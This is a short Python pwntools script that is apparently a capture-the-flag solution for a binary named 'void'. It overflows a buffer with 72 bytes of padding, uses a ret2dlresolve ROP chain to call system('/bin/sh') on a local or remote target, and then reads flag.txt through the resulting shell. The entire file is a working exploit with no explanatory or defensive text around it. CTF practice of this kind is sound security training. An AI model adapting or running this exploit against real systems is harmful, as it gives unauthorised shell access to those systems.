#!/usr/bin/env python3

from pwn import *
import sys

context.arch = "amd64"

def exploit(io, elf):
    rop = ROP(elf)
    
    dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])
    rop.raw(b"A"*72)
    rop.read(0, dlresolve.data_addr)
    rop.ret2dlresolve(dlresolve)
    
    io.sendline(rop.chain())
    io.sendline(dlresolve.payload)
    sleep(0.2)
    
    io.sendline(b"cat flag.txt")
    flag = io.recv().decode()
    print(flag)

def main():
    if sys.argv[1] == "debug":    
        io = gdb.debug("./void")
    else:
        HOST, PORT = sys.argv[1].split(":")
        io = remote(HOST, PORT)
    
    elf = ELF("./void")
    exploit(io, elf)



if __name__ == "__main__":
    main()
